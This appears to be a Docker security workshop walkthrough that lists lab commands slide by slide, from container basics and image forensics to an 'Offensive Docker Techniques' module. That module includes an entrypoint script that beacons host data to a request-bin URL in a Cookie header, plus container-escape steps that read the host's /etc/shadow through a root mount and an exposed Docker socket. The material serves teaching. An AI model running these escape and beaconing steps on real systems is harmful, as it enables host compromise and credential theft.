# Labs Walk Thru
##### This is an accompanying file with the lab instructions and commands to help walk thru the labs. It's especially intended for use for those that have trouble copying and pasting from the slides, or prefer not to.

## Module 1 - Docker

#### Slide 11 - Listing namespace you're in

```
ls -l /proc/self/ns/
```

#### Slide 12 - List cgroup for process 1

```
cat /proc/1/cgroup
```

#### Slide 16 - Docker client (exercise)

```
docker --help
```
```
docker run --help
```

#### Slide 17 - Docker health check (troubleshoot)

Is Docker reporting down or VM was stopped after setting up, try running these commands:

```
apt install acl -y
```
```
sudo systemctl status docker
```
Do this if status is not reporting up:

```
sudo systemctl restart docker
```

Create this ACL so you can run docker command without typing sudo everytime.
```
sudo setfacl -m user:$USER:rw /var/run/docker.sock
```

#### Slide 18 - Babby's first image
```
docker run hello-world
```

### Slide 19 - Single Command/Interactive Containers

Running single command in a container
```
docker run alpine ip addr
```

Run an interactive session (shell) within a container (interactive termianl
```
docker run -it alpine /bin/ash
```
Type `exit` to exit the shell session in the container

>  -i, --interactive                    Keep STDIN open even if not attached
>  
>  -t, --tty                            Allocate a pseudo-TTY

### Slide 20 - Interactive Containers (cont)

List running containers?
```
docker ps
```
Where's the container, was it destroyed?
```
docker ps --all
```

Note: Replace \<id\> below with the container id from the output of the above command.
  - Tip: you usually only need the first few letters of the id for Docker to locate.

```
docker start <id>
```
```
docker ps 
```
```
docker attach <id>
```

### Slide 21 - Background a container

```
docker run -d nginx
```

```
docker ps
```

```
docker stop <nginx_container_id>
```
  
Overide name commands (optional):
```
docker run -name webserver -d nginx
```
```
docker container ls
```

### Slide 22 - Container Persistence

```
docker ps -a
```

### Slide 23 - Process Hierarchy

```
docker run -d nginx
```
```
ps auxf
```

## Module 2 - Exploring Containers

### Slide 26 - Where do images come from?

```
docker search nmap
```

### Slide 28 - Exercise: Exploring Images and Container History

```
docker run --name hist -it alpine /bin/ash
```
Inside the container shell run:
```
mkdir test && touch /test/Lorem
```
```
exit
```
Back on the host run:
```
docker container diff hist
```
```
docker container commit hist history_test
```
```
docker image history history_test
```

### Slide 29 - Exercise: Exploring Container Images and History from DockerHub

```
docker search wellsfargo
```

### Slide 30 - Docker Image History

```
docker pull wellsfargo102/upload
```

```
docker image ls
```

```
docker history wellsfargo102/upload
```

```
docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" wellsfargo102/upload |less
```

### Slide 32 - Extract without running

```
docker create wellsfargo102/upload
```

Note: Replace $container_id with Container ID returned by last command (only need first part)
```
docker cp $container_id:/app.jar /tmp/app.jar
```
```
ls /tmp/*.jar
```
```
vim /tmp/app.jar
```
Remember `ESC :wq` to exit from vim/view

Now that we've extracted the jar, we can remove the container. Use same container id from a few commands ago for command below.
```
docker rm $container_id
```

### Slide 33 - Optional, quick checks

```
file /tmp/app.jar
```
```
mkdir /tmp/app
```
```
unzip /tmp/app.jar -d /tmp/app/
```
```
cat /tmp/app/META-INF/MANIFEST.MF
```
Note the start class
```
strings /tmp/app.jar |less 
```

### Slide 34 - Going the distance - decompile (with docker!)

```
docker run -it --rm -v /tmp/:/mnt/ --user $(id -u):$(id -g) kwart/jd-cli /mnt/app.jar -od /mnt/app-decompiled
```

```
ls /tmp/app-decompiled/
```

```
less /tmp/app-decompiled/BOOT-INF/classes/com/wellsfargo/uploadexcel/entity/StockDetailsEntity.java
```

### Slide 35 - Manual Reversing (just another way of extracting files from an image)

```
cd ~ && mkdir testimage && cd testimage
```
```
docker pull nginx
```
```
docker save -o nginx.tar nginx
```
```
tar -xvf nginx.tar
```

### Slide 36 - Manual Reversing cont.

```
cat <hash>.json | jq
```

### Slide 38 - Optional - Automated

```
sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 nginx:latest
```
```
sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 wellsfargo102/upload
```

### Slide 42 - is nginx real?

```
docker image inspect nginx | jq
```

```
docker trust inspect nginx | jq
```

## Module 3: Offensive Docker Techniques

### Slide 47 - Starting Tracee

Start a new terminal window
```
docker run --name tracee --rm -it --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro \
-e LIBBPFGO_OSRELEASE_FILE=/etc/os-release-host aquasec/tracee:latest
```

>Ctrl-C will stop tracee if needed

### Slide 48 - Create a Dockerfile

```
cd ~ && mkdir imagetest && cd imagetest && vi Dockerfile
```

Note: Go to requestbin.com and choose the public bin link below the large Create Request Bin button

Paste the below contents into the vi after hitting `i` for insert
```
FROM ubuntu:20.04
RUN groupadd -g 999 usertest && \
useradd -r -u 999 -g usertest usertest
RUN apt update && apt install -y curl tini
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
RUN chmod +x docker-entrypoint.sh
USER usertest
# Go to requestbin.com and get a public url and replace REQUESTBIN_URL below
ENV URL REQUESTBIN_URL
ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
# Replace HANDLE with your l33t hacker name or some other identifying designation
ENV USER HANDLE
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
> After pasting, hit `ESC`, then type `:wq`


### Slide 49 - Create an entrypoint script

```
vi docker-entrypoint.sh
```
Paste the below script into the vi after hitting `i` for insert 
```
#!/usr/bin/env bash

if [ "shell" = "${1}" ]; then
  /bin/bash
else
  while true
  do
    sleep 30
    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" $URL
    echo
  done
fi
```
> After pasting, hit `ESC`, then type `:wq`

### Slide 50 - Build and run your image

```
docker build -t cmddemo .
```

```
docker run cmddemo
```

### Slide 51 - Build and run your image (cont.)

The trick to this one is pasting the contents of the cookie field in the request you recieved on requestbin, into the base64 command below. This will decode it and pipe through gunzip to decompress the contents.
```
base64 -d <<< [cookie field content] | gunzip
```

>Take a look back at tracee terminal per slide 52

### Slide 53 - Observing Docker

```
docker ps
```
Note name or id of running container and use it in command below
```
docker stop [name or id of running cmddemo container]
```

```
docker events
```

>Alternative to docker events command:
>```
>sudo ctr --address /var/run/containerd/containerd.sock events
>```

### Slide 55 - Working with external data / using Docker in your offensive toolkit

```
docker run --rm -it instrumentisto/nmap -A -T4 scanme.nmap.org
```

Where's the output? (optional)
```
mkdir ~/vol_test && cd ~/vol_test/
```
```
docker run -v ~/vol_test:/output instrumentisto/nmap -sT -oA /output/test scanme.nmap.org 
```
```
ls -l ~/vol_test
```
```
cat test.nmap
```

### Slide 57 - Docker with root or etc mounted as volume

```
docker run -it -v /:/host alpine /bin/ash
```
```
cat /host/etc/shadow
```
```
exit
```

### Slide 58 - Docker running privileged containers

```
docker run -it --privileged ubuntu /bin/bash
```
```
apt update && apt-get install -y libcap2-bin
```
```
capsh --prunt
```
```
grep Cap /proc/self/status
```
```
capsh --decode=0000003fffffffff
```
```
exit
```

### Slide 59 - Exercise: Docker socket exposed in container

```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/dash
```

```
cd var/run/ && ls -l
```

```
apt update && apt install -y curl socat
```

```
echo '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}' > container.json
```

```
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
```
Make note of the first 4-5 characters of the ID returned, you'll need it in the next command.
```
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id 4-5 first chars>/start
```

### Slide 60 - Exposed docker socket hijinx (cont.)

```
socat - UNIX-CONNECT:/var/run/docker.sock
```
Make sure you do this carefully and be sure to put the container id in the POST url
```
POST /containers/<id-first-5-chars>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp


```
After hitting enter twice, the socket should return an http status indicating the connection was upgraded.
```
ls
```
```
cat /host_etc/shadow
```

### Slide 61 - Docker persistence

```
docker run --restart nginx
```


